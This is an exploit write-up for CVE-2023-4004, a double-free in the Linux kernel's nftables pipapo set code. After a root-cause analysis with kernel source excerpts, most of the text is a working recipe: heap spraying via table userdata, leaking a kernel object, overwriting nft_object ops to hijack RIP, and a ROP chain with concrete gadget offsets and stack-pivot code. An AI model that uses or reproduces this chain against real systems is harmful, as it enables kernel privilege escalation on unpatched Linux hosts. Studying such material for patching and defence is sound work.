# Exploit detail about CVE-2023-4004
If you want to get some base information about CVE-2023-4004, please read [vulnerability.md](./vulnerability.md) first.

## Background
nftables is a netfilter project that aims to replace the existing {ip,ip6,arp,eb}tables framework, providing a new packet filtering framework for {ip,ip6}tables, a new userspace utility (nft) and A compatibility layer. It uses existing hooks, link tracking system, user space queuing component and netfilter logging subsystem.

It consists of three main components: kernel implementation, libnl netlink communication and nftables user space front-end. The kernel provides a netlink configuration interface and runtime rule set evaluation. libnl contains basic functions for communicating with the kernel. The nftables front end is for user interaction through nft.

nftables implements data packet filtering by using some components like `table`, `set`, `chain`, `rule`.

## Cause anaylysis

As the code shows in function `nft_pipapo_remove` in /net/netfilter/nft_set_pipapo.c, when a pipapo set wants to remove a element, it find the element by using NFT_SET_EXT_KEY and NFT_SET_EXT_KEY_END:

```
    ...
        match_start = data;
		match_end = (const u8 *)nft_set_ext_key_end(&e->ext)->data;

		start = first_rule;
		rules_fx = rules_f0;

		nft_pipapo_for_each_field(f, i, m) {
			if (!pipapo_match_field(f, start, rules_fx,
						match_start, match_end))
				break;
    ...
```

But a NFT_SET_EXT_KEY_END is not necessary. Function `nft_pipapo_insert` shows a correct way to handle it:

```
    ...
	if (nft_set_ext_exists(ext, NFT_SET_EXT_KEY_END))
		end = (const u8 *)nft_set_ext_key_end(ext)->data;
	else
		end = start;
    ...
```


## Triggering the vulnerability

It's easy to trigger it by following this steps:

- Create a pipapo set
- Insert a element into the set without NFT_SET_EXT_KEY_END
- Flush the set without NFT_SET_EXT_KEY_END(After this, the element will be freed but won't be removed from the set)
- Flush the set without NFT_SET_EXT_KEY_END again(After this, the element will be freed again)

## Exploit it
CVE-2023-4004 is very easy to exploit because you can free the element many times. The size of the element is not stable which means there's many ways to exploit it:
```
void *nft_set_elem_init(const struct nft_set *set,
			const struct nft_set_ext_tmpl *tmpl,
			const u32 *key, const u32 *key_end,
			const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
{
	struct nft_set_ext *ext;
	void *elem;

	elem = kzalloc(set->ops->elemsize + tmpl->len, gfp);
	if (elem == NULL)
		return NULL;
    ...
```
The tmpl->len is related to your input like NFTA_SET_ELEM_USERDATA which means you can control the size of the element. So you just need to find a structure to leak information and control RIP. I choose to use some structures in nftables: `nft_tables` and `nft_object`
```
struct nft_table {
	struct list_head		list;
	struct rhltable			chains_ht;
	struct list_head		chains;
	struct list_head		sets;
	struct list_head		objects;
	struct list_head		flowtables;
	u64				hgenerator;
	u64				handle;
	u32				use;
	u16				family:6,
					flags:8,
					genmask:2;
	u32				nlpid;
	char				*name;
	u16				udlen;
	u8				*udata;
};

struct nft_object {
	struct list_head		list;
	struct rhlist_head		rhlhead;
	struct nft_object_hash_key	key;
	u32				genmask:2,
					use:30;
	u64				handle;
	u16				udlen;
	u8				*udata;
	/* runtime data below here */
	const struct nft_object_ops	*ops ____cacheline_aligned;
	unsigned char			data[]
		__attribute__((aligned(__alignof__(u64))));
};
```
It's easy to spray heap by creating many nft_table with NFTA_TABLE_USERDATA:
```
    ...
	if (nla[NFTA_TABLE_USERDATA]) {
		table->udata = nla_memdup(nla[NFTA_TABLE_USERDATA], GFP_KERNEL);
		if (table->udata == NULL)
			goto err_table_udata;

		table->udlen = nla_len(nla[NFTA_TABLE_USERDATA]);
	}
    ...
```
And nft_object has a pointer of a function list(`const struct nft_object_ops	*ops`), which will be useful for leaking information and control RIP. 

The size of the object is different when you use different type of object. I choose to use the `NFT_OBJECT_CT_EXPECT` object. The heap used by this object belongs to kmalloc-192.
### Leak info

I leak some useful infomation by the following steps.

- Create pipapo `set A`
- Insert `element B` into `set A` without NFT_SET_EXT_KEY_END(make sure sizeof(`element B`)>192 && sizeof(`element B`)<256)
- Flush `set A`, `element B` will be freed but won't be removed
- Create many tables with NFTA_TABLE_USERDATA to get the heap of `element B` back, the length of `NFTA_TABLE_USERDATA` should equal to sizeof(`element B`) 
- Flush `set A` again, `element B` will be freed again but won't be removed
- Create many objects, the size of the objects should equal to sizeof(`element B`). One of them will get the heap of `element B` back.
- Dump/Get all the tables we spray. The `NFTA_TABLE_USERDATA` of one of them should be a strcture of a object. 

### Control RIP
I control the RIP by the following steps which is very similar I used for leaking useful information:

- Create pipapo `set A`
- Insert `element B` into `set A` without NFT_SET_EXT_KEY_END(make sure sizeof(`element B`)>192 && sizeof(`element B`)<256)
- Flush `set A`, `element B` will be freed but won't be removed
- Create many tables with NFTA_TABLE_USERDATA to get the heap of `element B` back, the length of `NFTA_TABLE_USERDATA` should equal to sizeof(`element B`)
- Flush `set A` again, `element B` will be freed again but won't be removed
- Create many objects with `NFTA_OBJ_USERDATA`. The size of the objects should equal to sizeof(`element B`) . `NFTA_OBJ_USERDATA` of the object will be used for ROP.
- Dump/Get all the tables we spray. Find the target tables. The `NFTA_TABLE_USERDATA` of one of them should be a strcture of a object.
- Delete the target table to free the heap of the object.
- Spray many tables with NFTA_TABLE_USERDATA to get the heap of the object back. After this, we will fill fake data of the object. I overwrite object->ops to control RIP.
- Get target object, and we will finally jump to ROP.
  ```
  static int nft_object_dump(struct sk_buff *skb, unsigned int attr,
			   struct nft_object *obj, bool reset){
	struct nlattr *nest;

	nest = nla_nest_start_noflag(skb, attr);
	if (!nest)
		goto nla_put_failure;
	if (obj->ops->dump(skb, obj, reset) < 0)//After overwrite the ops, we can control RIP here.
		goto nla_put_failure;
	nla_nest_end(skb, nest);
	return 0;
	...
  ```
### ROP detail
Once we finish the step 7 of `Control RIP`, we can get the heap address of the `NFTA_OBJ_USERDATA` of target object, which we spray at step 6.
And I fill the fake data of the object by this:
```
    //ops is the pointer of the memory we will fill in NFTA_OBJ_USERDATA
    //the filed at 0x20 of ops is ops->dump.
    *(uint64_t *)&ops[0x20] = kernel_off + 0xffffffff8198954b;//push rsi ; jmp qword ptr [rsi + 0x39]
	...
    //The filed at 0x48 of the leak_obj is obj->udata, which will be created by NFTA_OBJ_USERDATA.
    uint64_t rop_target_addr = *(uint64_t *)(&leak_obj[0x48]);
    printf("rop : %lx\n", rop_target_addr);
    //Now we try to fill fake data of the object
    //stack migration first time 
    *(uint64_t *)(&leak_obj[0x39]) = kernel_off + 0xffffffff81027924;//pop rsp ; ret 
    // stack migration second time 
    *(uint64_t *)(&leak_obj[0]) = kernel_off + 0xffffffff81027924;//pop rsp ; ret
    *(uint64_t *)(&leak_obj[8]) = rop_target_addr + 0x60;//This is the final ROP address.
    *(uint64_t *)(&leak_obj[0x80]) = rop_target_addr;//the filed at 0x80 offset is a nft_object_ops	struct pointer which set to the heap addr of NFTA_OBJ_USERDATA.
	...
```

And the step of ROP looks like this:
```

 obj->ops->dump(skb, obj, reset)  ->  
 push rsi ; jmp qword ptr [rsi + 0x39] ->  //RSI will be the pointer of the object
 pop rsp ; ret -> //stack migration, the rsp will be the pointer of the object 
 pop rsp ; ret -> //stack migration again, the rsp will be rop_target_addr + 0x60(the pointer of the NFTA_OBJ_USERDATA + 0x60) 
 now we can do normal ROP here
```
